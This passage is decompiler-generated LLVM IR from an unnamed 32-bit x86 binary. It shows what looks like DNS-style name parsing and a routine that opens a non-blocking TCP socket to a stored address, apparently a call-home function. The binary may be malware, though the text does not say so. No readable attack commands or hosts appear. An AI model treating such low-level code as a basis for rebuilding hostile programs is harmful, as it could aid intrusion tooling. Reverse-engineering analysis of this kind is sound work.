  %v1_804f675 = add i32 %v0_804f6e8, 1
  %v2_804f675 = inttoptr i32 %v1_804f675 to i8*
  %v3_804f675 = load i8, i8* %v2_804f675, align 1
  %v4_804f675 = zext i8 %v3_804f675 to i32
  store i32 1, i32* %ecx.global-to-local, align 4
  %v2_804f683 = mul nuw nsw i32 %v1_804f670, 256
  %v2_804f686 = add nsw i32 %v2_804f683, -49152
  %v3_804f686 = or i32 %v4_804f675, %v2_804f686
  store i32 %v3_804f686, i32* %eax.global-to-local, align 4
  %v2_804f691 = add i32 %v1_804f68d, %v3_804f686
  store i32 %v2_804f691, i32* %edx.global-to-local, align 4
  %v1_804f693 = inttoptr i32 %v2_804f691 to i8*
  %v2_804f693 = load i8, i8* %v1_804f693, align 1
  %v3_804f693 = zext i8 %v2_804f693 to i32
  %v6_804f693 = or i32 %v3_804f693, %v2_804f686
  store i32 %v6_804f693, i32* %eax.global-to-local, align 4
  %v4_804f695 = icmp eq i8 %v2_804f693, 0
  %v1_804f697 = icmp eq i1 %v4_804f695, false
  br i1 %v1_804f697, label %dec_label_pc_804f66c, label %dec_label_pc_804f699

dec_label_pc_804f699:                             ; preds = %dec_label_pc_804f6e8, %dec_label_pc_804f670, %dec_label_pc_804f65d
  %v1_804f699 = phi i32 [ 0, %dec_label_pc_804f65d ], [ 1, %dec_label_pc_804f670 ], [ %v0_804f6e9, %dec_label_pc_804f6e8 ]
  %v0_804f699 = phi i32 [ 1, %dec_label_pc_804f65d ], [ %v0_804f6ec, %dec_label_pc_804f670 ], [ %v3_804f6ec, %dec_label_pc_804f6e8 ]
  %v2_804f699 = add i32 %v0_804f699, %v1_804f699
  store i32 %v2_804f699, i32* @ebx, align 4
  %v2_804f69b = add i32 %v2_804f699, %v1_804f654
  br label %dec_label_pc_804f5fd.backedge

dec_label_pc_804f5fd.backedge:                    ; preds = %dec_label_pc_804f699, %dec_label_pc_804f710
  %v0_804f5fd = phi i32 [ %v0_804f602127, %dec_label_pc_804f699 ], [ %v0_804f5fd.pre, %dec_label_pc_804f710 ]
  %storemerge = phi i32 [ %v2_804f69b, %dec_label_pc_804f699 ], [ %v2_804f71b, %dec_label_pc_804f710 ]
  store i32 %storemerge, i32* %ecx.global-to-local, align 4
  %v1_804f5fd = add i32 %v0_804f5fd, 22
  %v2_804f5fd = inttoptr i32 %v1_804f5fd to i16*
  %v3_804f5fd = load i16, i16* %v2_804f5fd, align 2
  %v4_804f5fd = add i16 %v3_804f5fd, -1
  store i16 %v4_804f5fd, i16* %v2_804f5fd, align 2
  %v0_804f602 = load i32, i32* @esp, align 4
  %v1_804f602 = add i32 %v0_804f602, 22
  %v2_804f602 = inttoptr i32 %v1_804f602 to i16*
  %v3_804f602 = load i16, i16* %v2_804f602, align 2
  %v13_804f602 = icmp eq i16 %v3_804f602, -1
  br i1 %v13_804f602, label %dec_label_pc_804f594, label %dec_label_pc_804f60a

dec_label_pc_804f6a3:                             ; preds = %dec_label_pc_804f594
  %v1_804f6a3 = add i32 %v2_804f5a0, 4
  %v2_804f6a3 = inttoptr i32 %v1_804f6a3 to i32*
  %v3_804f6a3 = load i32, i32* %v2_804f6a3, align 4
  store i32 %v3_804f6a3, i32* %eax.global-to-local, align 4
  %v1_804f6a6 = icmp eq i32 %v3_804f6a3, 0
  br i1 %v1_804f6a6, label %dec_label_pc_804f6b6, label %dec_label_pc_804f6aa

dec_label_pc_804f6aa:                             ; preds = %dec_label_pc_804f6a3
  %v3_804f6ad = inttoptr i32 %v0_804f59d to i32*
  store i32 %v3_804f6a3, i32* %v3_804f6ad, align 4
  %v1_804f6ae = call i32 @function_80538e9(i32 1)
  store i32 %v1_804f6ae, i32* %eax.global-to-local, align 4
  %v0_804f6b3 = load i32, i32* @esp, align 4
  %v1_804f6b3 = add i32 %v0_804f6b3, 16
  br label %dec_label_pc_804f6b6

dec_label_pc_804f6b6:                             ; preds = %dec_label_pc_804f6a3, %dec_label_pc_804f6aa
  %v0_804f6b6 = phi i32 [ %v1_804f59d, %dec_label_pc_804f6a3 ], [ %v1_804f6b3, %dec_label_pc_804f6aa ]
  %v2_804f6b9 = inttoptr i32 %v0_804f6b6 to i32*
  %v3_804f6b9 = load i32, i32* %v2_804f6b9, align 4
  store i32 %v3_804f6b9, i32* @esi, align 4
  %v2_804f6bd = add i32 %v0_804f6b6, -16
  %v3_804f6bd = inttoptr i32 %v2_804f6bd to i32*
  store i32 %v3_804f6b9, i32* %v3_804f6bd, align 4
  %v1_804f6be = call i32 @function_80538e9(i32 1)
  store i32 %v1_804f6be, i32* %eax.global-to-local, align 4
  %v0_804f6c3 = load i32, i32* @esp, align 4
  %v1_804f6c3 = add i32 %v0_804f6c3, 16
  %v2_804f6c3 = inttoptr i32 %v1_804f6c3 to i32*
  store i32 0, i32* %v2_804f6c3, align 4
  %v0_804f6cb = load i32, i32* @esp, align 4
  %v1_804f6cb = add i32 %v0_804f6cb, 16
  %v1_804f6ce = inttoptr i32 %v1_804f6cb to i32*
  %v2_804f6ce = load i32, i32* %v1_804f6ce, align 4
  store i32 %v2_804f6ce, i32* %eax.global-to-local, align 4
  %v1_804f6d1 = add i32 %v0_804f6cb, 4300
  %v1_804f6d7 = inttoptr i32 %v1_804f6d1 to i32*
  %v2_804f6d7 = load i32, i32* %v1_804f6d7, align 4
  store i32 %v2_804f6d7, i32* @ebx, align 4
  %v3_804f6d8 = add i32 %v0_804f6cb, 4308
  %v1_804f6d9 = inttoptr i32 %v3_804f6d8 to i32*
  %v2_804f6d9 = load i32, i32* %v1_804f6d9, align 4
  store i32 %v2_804f6d9, i32* @edi, align 4
  %v3_804f6d9 = add i32 %v0_804f6cb, 4312
  %v1_804f6da = inttoptr i32 %v3_804f6d9 to i32*
  %v2_804f6da = load i32, i32* %v1_804f6da, align 4
  store i32 %v2_804f6da, i32* @ebp, align 4
  ret i32 %v2_804f6ce

dec_label_pc_804f6dc:                             ; preds = %dec_label_pc_804f619
  %v1_804f6dc = add i32 %v0_804f6dc, 1
  store i32 %v1_804f6dc, i32* %edx.global-to-local, align 4
  %v5_804f6dd = icmp eq i32 %v0_804f6dd, 0
  %v2_804f6e0 = zext i1 %v5_804f6dd to i32
  %v3_804f6e0 = add i32 %v2_804f6e0, %v0_804f6e0
  %v1_804f613 = inttoptr i32 %v1_804f6dc to i8*
  %v2_804f613 = load i8, i8* %v1_804f613, align 1
  %v3_804f613 = zext i8 %v2_804f613 to i32
  %v5_804f613 = and i32 %v4_804f613, -256
  %v6_804f613 = or i32 %v3_804f613, %v5_804f613
  store i32 %v6_804f613, i32* %eax.global-to-local, align 4
  %v4_804f615 = icmp eq i8 %v2_804f613, 0
  br i1 %v4_804f615, label %dec_label_pc_804f64a, label %dec_label_pc_804f619.preheader

dec_label_pc_804f6e8:                             ; preds = %dec_label_pc_804f66c
  %v1_804f6e8 = add i32 %v0_804f6e8, 1
  store i32 %v1_804f6e8, i32* %edx.global-to-local, align 4
  %v5_804f6e9 = icmp eq i32 %v0_804f6e9, 0
  %v2_804f6ec = zext i1 %v5_804f6e9 to i32
  %v3_804f6ec = add i32 %v2_804f6ec, %v0_804f6ec
  %v1_804f666 = inttoptr i32 %v1_804f6e8 to i8*
  %v2_804f666 = load i8, i8* %v1_804f666, align 1
  %v3_804f666 = zext i8 %v2_804f666 to i32
  %v5_804f666 = and i32 %v4_804f666, -256
  %v6_804f666 = or i32 %v3_804f666, %v5_804f666
  store i32 %v6_804f666, i32* %eax.global-to-local, align 4
  %v4_804f668 = icmp eq i8 %v2_804f666, 0
  br i1 %v4_804f668, label %dec_label_pc_804f699, label %dec_label_pc_804f66c.preheader

dec_label_pc_804f6f4:                             ; preds = %dec_label_pc_804f64a
  %v1_804f6f4 = add i32 %v2_804f64c, 2
  %v2_804f6f4 = inttoptr i32 %v1_804f6f4 to i16*
  %v3_804f6f4 = load i16, i16* %v2_804f6f4, align 2
  %v9_804f6f4 = icmp eq i16 %v3_804f6f4, 256
  %v1_804f6fa = icmp eq i1 %v9_804f6f4, false
  br i1 %v1_804f6fa, label %dec_label_pc_804f65d, label %dec_label_pc_804f700

dec_label_pc_804f700:                             ; preds = %dec_label_pc_804f6f4
  %v1_804f700 = add i32 %v2_804f64c, 8
  %v2_804f700 = inttoptr i32 %v1_804f700 to i16*
  %v3_804f700 = load i16, i16* %v2_804f700, align 2
  %v4_804f700 = zext i16 %v3_804f700 to i32
  %v6_804f700 = and i32 %v5_804f700, -65536
  %v7_804f700 = or i32 %v4_804f700, %v6_804f700
  store i32 %v7_804f700, i32* %edx.global-to-local, align 4
  %v2_804f706 = call i16 @llvm.bswap.i16(i16 %v3_804f700)
  %v3_804f706 = zext i16 %v2_804f706 to i32
  %v6_804f706 = or i32 %v3_804f706, %v6_804f700
  store i32 %v6_804f706, i32* %eax.global-to-local, align 4
  %v10_804f70a = icmp eq i16 %v3_804f700, 1024
  br i1 %v10_804f70a, label %dec_label_pc_804f723, label %dec_label_pc_804f710

dec_label_pc_804f710:                             ; preds = %dec_label_pc_804f700, %dec_label_pc_804f723
  %v0_804f5fd.pre = phi i32 [ %v0_804f602127, %dec_label_pc_804f700 ], [ %v0_804f5fd.pre.pre, %dec_label_pc_804f723 ]
  %v0_804f71b = phi i32 [ %v1_804f654, %dec_label_pc_804f700 ], [ %v0_804f71b.pre, %dec_label_pc_804f723 ]
  %v0_804f710 = phi i32 [ %v7_804f700, %dec_label_pc_804f700 ], [ %v7_804f787, %dec_label_pc_804f723 ]
  %v1_804f710 = trunc i32 %v0_804f710 to i16
  %v2_804f710 = call i16 @llvm.bswap.i16(i16 %v1_804f710)
  %v3_804f710 = zext i16 %v2_804f710 to i32
  %v5_804f710 = and i32 %v0_804f710, -65536
  %v6_804f710 = or i32 %v3_804f710, %v5_804f710
  store i32 %v6_804f710, i32* %edx.global-to-local, align 4
  store i32 %v3_804f710, i32* %eax.global-to-local, align 4
  %v2_804f71b = add i32 %v3_804f710, %v0_804f71b
  br label %dec_label_pc_804f5fd.backedge

dec_label_pc_804f723:                             ; preds = %dec_label_pc_804f700
  %v2_804f723 = inttoptr i32 %v1_804f654 to i8*
  %v3_804f723 = load i8, i8* %v2_804f723, align 1
  %v4_804f723 = zext i8 %v3_804f723 to i32
  %v6_804f723 = and i32 %v6_804f706, -256
  %v7_804f723 = or i32 %v4_804f723, %v6_804f723
  store i32 %v7_804f723, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v3_804f728 = add i32 %v0_804f602127, 4280
  %v4_804f728 = inttoptr i32 %v3_804f728 to i8*
  store i8 %v3_804f723, i8* %v4_804f728, align 1
  %v0_804f72f = load i32, i32* @edi, align 4
  %v1_804f72f = add i32 %v0_804f72f, 1
  %v2_804f72f = inttoptr i32 %v1_804f72f to i8*
  %v3_804f72f = load i8, i8* %v2_804f72f, align 1
  %v4_804f72f = zext i8 %v3_804f72f to i32
  %v5_804f72f = load i32, i32* %eax.global-to-local, align 4
  %v6_804f72f = and i32 %v5_804f72f, -256
  %v7_804f72f = or i32 %v6_804f72f, %v4_804f72f
  store i32 %v7_804f72f, i32* %eax.global-to-local, align 4
  %v2_804f732 = load i32, i32* @esp, align 4
  %v3_804f732 = add i32 %v2_804f732, 4281
  %v4_804f732 = inttoptr i32 %v3_804f732 to i8*
  store i8 %v3_804f72f, i8* %v4_804f732, align 1
  %v0_804f739 = load i32, i32* @edi, align 4
  %v1_804f739 = add i32 %v0_804f739, 2
  %v2_804f739 = inttoptr i32 %v1_804f739 to i8*
  %v3_804f739 = load i8, i8* %v2_804f739, align 1
  %v4_804f739 = zext i8 %v3_804f739 to i32
  %v5_804f739 = load i32, i32* %eax.global-to-local, align 4
  %v6_804f739 = and i32 %v5_804f739, -256
  %v7_804f739 = or i32 %v6_804f739, %v4_804f739
  store i32 %v7_804f739, i32* %eax.global-to-local, align 4
  %v2_804f73c = load i32, i32* @esp, align 4
  %v3_804f73c = add i32 %v2_804f73c, 4282
  %v4_804f73c = inttoptr i32 %v3_804f73c to i8*
  store i8 %v3_804f739, i8* %v4_804f73c, align 1
  %v0_804f743 = load i32, i32* @edi, align 4
  %v1_804f743 = add i32 %v0_804f743, 3
  %v2_804f743 = inttoptr i32 %v1_804f743 to i8*
  %v3_804f743 = load i8, i8* %v2_804f743, align 1
  %v4_804f743 = zext i8 %v3_804f743 to i32
  %v5_804f743 = load i32, i32* %eax.global-to-local, align 4
  %v6_804f743 = and i32 %v5_804f743, -256
  %v7_804f743 = or i32 %v6_804f743, %v4_804f743
  store i32 %v7_804f743, i32* %eax.global-to-local, align 4
  %v2_804f746 = load i32, i32* @esp, align 4
  %v3_804f746 = add i32 %v2_804f746, 4283
  %v4_804f746 = inttoptr i32 %v3_804f746 to i8*
  store i8 %v3_804f743, i8* %v4_804f746, align 1
  %v0_804f74d = load i32, i32* %eax.global-to-local, align 4
  %v1_804f74d = load i32, i32* @esp, align 4
  %v2_804f74d = add i32 %v1_804f74d, -4
  %v3_804f74d = inttoptr i32 %v2_804f74d to i32*
  store i32 %v0_804f74d, i32* %v3_804f74d, align 4
  %v0_804f74e = load i32, i32* %eax.global-to-local, align 4
  %v2_804f74e = add i32 %v1_804f74d, -8
  %v3_804f74e = inttoptr i32 %v2_804f74e to i32*
  store i32 %v0_804f74e, i32* %v3_804f74e, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804f751 = inttoptr i32 %v1_804f74d to i32*
  %v3_804f751 = load i32, i32* %v2_804f751, align 4
  store i32 %v3_804f751, i32* @edx, align 4
  %v1_804f755 = inttoptr i32 %v3_804f751 to i8*
  %v2_804f755 = load i8, i8* %v1_804f755, align 1
  %v3_804f755 = zext i8 %v2_804f755 to i32
  %v1_804f757 = mul nuw nsw i32 %v3_804f755, 4
  %v2_804f757 = add nuw nsw i32 %v1_804f757, 4
  store i32 %v2_804f757, i32* %eax.global-to-local, align 4
  %v2_804f75e = add i32 %v1_804f74d, -12
  %v3_804f75e = inttoptr i32 %v2_804f75e to i32*
  store i32 %v2_804f757, i32* %v3_804f75e, align 4
  %v0_804f75f = load i32, i32* @edx, align 4
  %v1_804f75f = add i32 %v0_804f75f, 4
  %v2_804f75f = inttoptr i32 %v1_804f75f to i32*
  %v3_804f75f = load i32, i32* %v2_804f75f, align 4
  store i32 %v3_804f75f, i32* %eax.global-to-local, align 4
  %v2_804f762 = add i32 %v1_804f74d, -16
  %v3_804f762 = inttoptr i32 %v2_804f762 to i32*
  store i32 %v3_804f75f, i32* %v3_804f762, align 4
  %v0_804f763 = call i32 @function_805338c()
  store i32 %v0_804f763, i32* %eax.global-to-local, align 4
  %v0_804f768 = load i32, i32* @esp, align 4
  %v1_804f768 = add i32 %v0_804f768, 16
  %v2_804f768 = inttoptr i32 %v1_804f768 to i32*
  %v3_804f768 = load i32, i32* %v2_804f768, align 4
  store i32 %v3_804f768, i32* %ecx.global-to-local, align 4
  %v1_804f76c = inttoptr i32 %v3_804f768 to i8*
  %v2_804f76c = load i8, i8* %v1_804f76c, align 1
  %v3_804f76c = zext i8 %v2_804f76c to i32
  %v4_804f76c = load i32, i32* @edx, align 4
  %v5_804f76c = and i32 %v4_804f76c, -256
  %v6_804f76c = or i32 %v5_804f76c, %v3_804f76c
  store i32 %v6_804f76c, i32* %edx.global-to-local, align 4
  %v2_804f76e = add i32 %v3_804f768, 4
  %v3_804f76e = inttoptr i32 %v2_804f76e to i32*
  store i32 %v0_804f763, i32* %v3_804f76e, align 4
  %v0_804f771 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f771 = urem i32 %v0_804f771, 256
  %v2_804f771 = load i32, i32* @ebx, align 4
  %v3_804f771 = and i32 %v2_804f771, -256
  %v4_804f771 = or i32 %v3_804f771, %v1_804f771
  store i32 %v4_804f771, i32* @ebx, align 4
  %v0_804f773 = load i32, i32* @esp, align 4
  %v1_804f773 = add i32 %v0_804f773, 4296
  %v2_804f773 = inttoptr i32 %v1_804f773 to i32*
  %v3_804f773 = load i32, i32* %v2_804f773, align 4
  store i32 %v3_804f773, i32* %ecx.global-to-local, align 4
  %v1_804f77a = add i32 %v0_804f771, 1
  store i32 %v1_804f77a, i32* %edx.global-to-local, align 4
  %v3_804f77b = mul i32 %v4_804f771, 4
  %v4_804f77b = add i32 %v3_804f77b, %v0_804f763
  %v5_804f77b = inttoptr i32 %v4_804f77b to i32*
  store i32 %v3_804f773, i32* %v5_804f77b, align 4
  %v0_804f77e = load i32, i32* @esp, align 4
  %v1_804f77e = add i32 %v0_804f77e, 16
  %v2_804f77e = inttoptr i32 %v1_804f77e to i32*
  %v3_804f77e = load i32, i32* %v2_804f77e, align 4
  store i32 %v3_804f77e, i32* %eax.global-to-local, align 4
  %v0_804f785 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f785 = trunc i32 %v0_804f785 to i8
  %v3_804f785 = inttoptr i32 %v3_804f77e to i8*
  store i8 %v1_804f785, i8* %v3_804f785, align 1
  %v0_804f787 = load i32, i32* @esi, align 4
  %v1_804f787 = add i32 %v0_804f787, 8
  %v2_804f787 = inttoptr i32 %v1_804f787 to i16*
  %v3_804f787 = load i16, i16* %v2_804f787, align 2
  %v4_804f787 = zext i16 %v3_804f787 to i32
  %v5_804f787 = load i32, i32* %edx.global-to-local, align 4
  %v6_804f787 = and i32 %v5_804f787, -65536
  %v7_804f787 = or i32 %v6_804f787, %v4_804f787
  store i32 %v7_804f787, i32* %edx.global-to-local, align 4
  %v0_804f71b.pre = load i32, i32* @edi, align 4
  %v0_804f5fd.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804f710

; uselistorder directives
  uselistorder i32 %v7_804f787, { 1, 0 }
  uselistorder i32 %v0_804f771, { 1, 0 }
  uselistorder i32 %v3_804f710, { 0, 2, 1 }
  uselistorder i32 %v0_804f710, { 1, 0 }
  uselistorder i32 %v6_804f666, { 1, 0 }
  uselistorder i32 %v3_804f6ec, { 1, 0 }
  uselistorder i32 %v1_804f6e8, { 1, 2, 0 }
  uselistorder i32 %v6_804f613, { 2, 1, 0 }
  uselistorder i32 %v3_804f6e0, { 1, 0 }
  uselistorder i32 %v1_804f6dc, { 2, 3, 1, 0 }
  uselistorder i32 %v0_804f6b6, { 1, 0 }
  uselistorder i32 %v0_804f602, { 2, 1, 0 }
  uselistorder i32 %v6_804f693, { 1, 0 }
  uselistorder i32 %v2_804f691, { 1, 2, 0 }
  uselistorder i32 %v3_804f686, { 1, 0 }
  uselistorder i32 %v4_804f666, { 1, 0, 2 }
  uselistorder i32 %v0_804f6e9, { 2, 0, 1 }
  uselistorder i32 %v0_804f6ec, { 1, 0 }
  uselistorder i32 %v1_804f654, { 5, 4, 1, 0, 2, 3, 6 }
  uselistorder i32 %v6_804f644, { 0, 2, 1 }
  uselistorder i32 %v2_804f642, { 0, 2, 3, 1 }
  uselistorder i32 %v3_804f637, { 1, 0 }
  uselistorder i32 %v4_804f613, { 1, 0, 2 }
  uselistorder i32 %v0_804f6dd, { 2, 0, 1 }
  uselistorder i32 %v0_804f6e0, { 1, 0 }
  uselistorder i32 %v6_804f61316, { 1, 0, 2 }
  uselistorder i32 %v0_804f60a, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_804f602127, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v0_804f602122, { 0, 2, 1 }
  uselistorder i32 %v1_804f5d3, { 1, 0 }
  uselistorder i32 %v0_804f5cf, { 0, 1, 2, 4, 5, 3 }
  uselistorder i32 %v2_804f5ca, { 1, 0, 2 }
  uselistorder i32 %v0_804f59d, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v3_804f55e, { 1, 0 }
  uselistorder i32 %v0_804f50f, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10 }
  uselistorder i32 %v0_804f50a, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804f4d7, { 1, 0 }
  uselistorder i32 %v2_804f4d4, { 1, 0 }
  uselistorder i32 %v0_804f4d0, { 1, 0 }
  uselistorder i32 %v1_804f4bd, { 2, 0, 1, 3 }
  uselistorder i32 %v12_804f4b1, { 1, 0 }
  uselistorder i32 %v0_804f4ae, { 2, 0, 1 }
  uselistorder i32 %v0_804f499, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_804f477, { 0, 6, 1, 2, 3, 4, 5 }
  uselistorder i32 %v0_804f458, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v3_804f453, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804f438, { 1, 0 }
  uselistorder i32 %v2_804f3bf, { 1, 0 }
  uselistorder i32 %v1_804f3b1, { 1, 0 }
  uselistorder i32 %v1_804f353, { 1, 0 }
  uselistorder i8 %v2_804f342, { 2, 0, 3, 1 }
  uselistorder i32 %v0_804f33c, { 0, 2, 3, 1 }
  uselistorder i32 %v2_804f310, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-44, { 0, 2, 1 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21 }
  uselistorder i32* %ecx.global-to-local, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 23, 27, 16, 17, 18, 19, 20, 21, 22, 60, 24, 25, 26, 58, 59, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57 }
  uselistorder i16 -1, { 2, 3, 0, 1 }
  uselistorder i32 4312, { 1, 0 }
  uselistorder i32 4308, { 1, 0 }
  uselistorder i32 4300, { 1, 0 }
  uselistorder i32 (i32)* @function_8053d40, { 6, 0, 5, 4, 3, 2, 1 }
  uselistorder i32 (i8*)* @function_8051bf0, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 23, 24, 25, 26, 27, 21, 22, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 68, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 69, 70, 0, 71, 72, 73 }
  uselistorder label %dec_label_pc_804f710, { 1, 0 }
  uselistorder label %dec_label_pc_804f6b6, { 1, 0 }
  uselistorder label %dec_label_pc_804f5fd.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_804f66c, { 1, 0 }
  uselistorder label %dec_label_pc_804f66c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804f619, { 1, 0 }
  uselistorder label %dec_label_pc_804f619.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804f60a, { 1, 0 }
  uselistorder label %dec_label_pc_804f594, { 5, 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804f44c, { 1, 0 }
  uselistorder label %dec_label_pc_804f342, { 1, 0 }
}

define i32 @function_804f7b0() local_unnamed_addr {
dec_label_pc_804f7b0:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_804f7b0 = load i32, i32* @ebx, align 4
  %v0_804f7b1 = load i32, i32* @eax, align 4
  store i32 %v0_804f7b1, i32* @ebx, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_804f7d6 = add i32 %v0_804f7b1, 4
  %v2_804f7d6 = inttoptr i32 %v1_804f7d6 to i32*
  %v3_804f7d6 = load i32, i32* %v2_804f7d6, align 4
  %v10_804f7d9 = icmp eq i32 %v3_804f7d6, -1
  br i1 %v10_804f7d9, label %dec_label_pc_804f7b0.dec_label_pc_804f7ea_crit_edge, label %dec_label_pc_804f7de

dec_label_pc_804f7b0.dec_label_pc_804f7ea_crit_edge: ; preds = %dec_label_pc_804f7b0
  br label %dec_label_pc_804f7ea

dec_label_pc_804f7de:                             ; preds = %dec_label_pc_804f7b0
  %v1_804f7e2 = call i32 @function_8052191(i32 %v3_804f7d6)
  br label %dec_label_pc_804f7ea

dec_label_pc_804f7ea:                             ; preds = %dec_label_pc_804f7b0.dec_label_pc_804f7ea_crit_edge, %dec_label_pc_804f7de
  %v3_804f7f1 = call i32 @function_8052985(i32 2, i32 1, i32 0)
  %v1_804f7f9 = load i32, i32* @ebx, align 4
  %v2_804f7f9 = add i32 %v1_804f7f9, 4
  %v3_804f7f9 = inttoptr i32 %v2_804f7f9 to i32*
  store i32 %v3_804f7f1, i32* %v3_804f7f9, align 4
  %v8_804f7fc = icmp eq i32 %v3_804f7f1, -1
  br i1 %v8_804f7fc, label %dec_label_pc_804f7ea.dec_label_pc_804f873_crit_edge, label %dec_label_pc_804f7ff

dec_label_pc_804f7ea.dec_label_pc_804f873_crit_edge: ; preds = %dec_label_pc_804f7ea
  br label %dec_label_pc_804f873

dec_label_pc_804f7ff:                             ; preds = %dec_label_pc_804f7ea
  %v0_804f801 = load i32, i32* @ebx, align 4
  %v1_804f801 = add i32 %v0_804f801, 28
  store i32 %v1_804f801, i32* @eax, align 4
  %v1_804f809 = add i32 %v0_804f801, 24
  %v2_804f809 = inttoptr i32 %v1_804f809 to i32*
  store i32 0, i32* %v2_804f809, align 4
  %v0_804f810 = load i32, i32* @eax, align 4
  %v2_804f811 = call i32 @function_8051c80(i32 %v0_804f810, i32 256)
  %v0_804f819 = load i32, i32* @ebx, align 4
  %v1_804f819 = add i32 %v0_804f819, 4
  %v2_804f819 = inttoptr i32 %v1_804f819 to i32*
  %v3_804f819 = load i32, i32* %v2_804f819, align 4
  %v3_804f821 = call i32 @function_80520cd(i32 %v3_804f819, i32 3, i32 0)
  %v0_804f829 = load i32, i32* @ebx, align 4
  %v1_804f829 = add i32 %v0_804f829, 4
  %v2_804f829 = inttoptr i32 %v1_804f829 to i32*
  %v3_804f829 = load i32, i32* %v2_804f829, align 4
  %v12_804f82c = or i32 %v3_804f821, 2048
  %v3_804f833 = call i32 @function_80520cd(i32 %v3_804f829, i32 4, i32 %v12_804f82c)
  %v0_804f838 = load i32, i32* @ebx, align 4
  store i32 2, i32* %stack_var_-20, align 4
  %v0_804f84e = load i32, i32* @global_var_80568f0.34, align 16
  %v2_804f853 = add i32 %v0_804f838, 8
  %v3_804f853 = inttoptr i32 %v2_804f853 to i32*
  store i32 %v0_804f84e, i32* %v3_804f853, align 4
  %v2_804f856 = ptrtoint i32* %stack_var_-20 to i32
  %v0_804f85d = load i32, i32* @ebx, align 4
  %v1_804f85d = add i32 %v0_804f85d, 4
  %v2_804f85d = inttoptr i32 %v1_804f85d to i32*
  %v3_804f85d = load i32, i32* %v2_804f85d, align 4
  store i32 %v3_804f85d, i32* %edx.global-to-local, align 4
  %v1_804f860 = add i32 %v0_804f85d, 12
  %v2_804f860 = inttoptr i32 %v1_804f860 to i32*
  store i32 1, i32* %v2_804f860, align 4
  %v0_804f86a = load i32, i32* %edx.global-to-local, align 4
  %v3_804f86b = call i32 @function_80527aa(i32 %v0_804f86a, i32 %v2_804f856, i32 16)
  br label %dec_label_pc_804f873

dec_label_pc_804f873:                             ; preds = %dec_label_pc_804f7ea.dec_label_pc_804f873_crit_edge, %dec_label_pc_804f7ff
  %v0_804f877 = phi i32 [ 0, %dec_label_pc_804f7ea.dec_label_pc_804f873_crit_edge ], [ %v3_804f86b, %dec_label_pc_804f7ff ]
  store i32 %v0_804f7b0, i32* @ebx, align 4
  ret i32 %v0_804f877

; uselistorder directives
  uselistorder i32 %v3_804f7d6, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder i32 (i32, i32)* @function_8051c80, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804f873, { 1, 0 }
  uselistorder label %dec_label_pc_804f7ea, { 1, 0 }
}

define i32 @function_805001e() local_unnamed_addr {
dec_label_pc_805001e:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  br label %dec_label_pc_8050542

dec_label_pc_8050542:                             ; preds = %dec_label_pc_805052e, %dec_label_pc_805001e
  %v0_805001e = load i32, i32* @global_var_80568f0.34, align 16
  store i32 %v0_805001e, i32* @esi, align 4
  %v0_8050024 = load i32, i32* @esp, align 4
  %v1_8050024 = add i32 %v0_8050024, 24
  %v2_8050024 = inttoptr i32 %v1_8050024 to i32*
  %v3_8050024 = load i32, i32* %v2_8050024, align 4
  %v15_8050024 = icmp eq i32 %v3_8050024, %v0_805001e
  br i1 %v15_8050024, label %dec_label_pc_80502dd, label %dec_label_pc_805002e

dec_label_pc_805002e:                             ; preds = %dec_label_pc_8050542
  %v1_805002e = add i32 %v0_8050024, 1828
  store i32 %v1_805002e, i32* @ebp, align 4
  %v1_8050035 = add i32 %v0_8050024, 1868
  %v2_8050035 = inttoptr i32 %v1_8050035 to i32*
  store i32 0, i32* %v2_8050035, align 4
  %v0_80501e3.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80501e3

dec_label_pc_8050045:                             ; preds = %dec_label_pc_8050257
  %v11_8050045 = icmp eq i8 %v2_805023a, -84
  br i1 %v11_8050045, label %dec_label_pc_80502a2, label %dec_label_pc_805004e

dec_label_pc_805004e:                             ; preds = %dec_label_pc_8050045
  %v10_805004e = icmp eq i8 %v2_805023a, 100
  br i1 %v10_805004e, label %dec_label_pc_805004e.dec_label_pc_805026e_crit_edge, label %dec_label_pc_8050057

dec_label_pc_805004e.dec_label_pc_805026e_crit_edge: ; preds = %dec_label_pc_805004e
